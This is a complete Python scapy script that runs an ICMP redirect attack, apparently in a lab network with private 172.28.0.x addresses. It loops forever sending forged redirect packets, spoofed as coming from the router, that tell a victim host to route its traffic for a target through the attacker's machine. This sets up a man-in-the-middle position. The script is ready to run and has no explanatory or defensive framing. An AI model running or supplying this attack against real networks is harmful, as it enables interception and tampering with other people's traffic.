from scapy.all import *
import time

# Network configuration
victim_ip = "172.28.0.20"
router_ip = "172.28.0.30"
attacker_ip = "172.28.0.10"
target_ip = "172.28.0.100"

print("[*] Starting ICMP Redirect attack...")
print(f"[*] Victim: {victim_ip}")
print(f"[*] Router: {router_ip}")
print(f"[*] Attacker: {attacker_ip}")
print(f"[*] Target: {target_ip}")

# Wait a bit for victim to establish initial route
time.sleep(5)
print("[*] Sending ICMP redirect packets...")

while True:
    try:
        spoofed_packet = IP(src=router_ip, dst=victim_ip) / \
                         ICMP(type=5, code=1, gw=attacker_ip) / \
                         IP(src=victim_ip, dst=target_ip) / b'\x00' * 8
        send(spoofed_packet, verbose=0)
        print(f"[*] Sent ICMP redirect to {victim_ip} -> route {target_ip} via {attacker_ip}")
    except Exception as e:
        print(f"[!] Error: {e}")
    time.sleep(2)
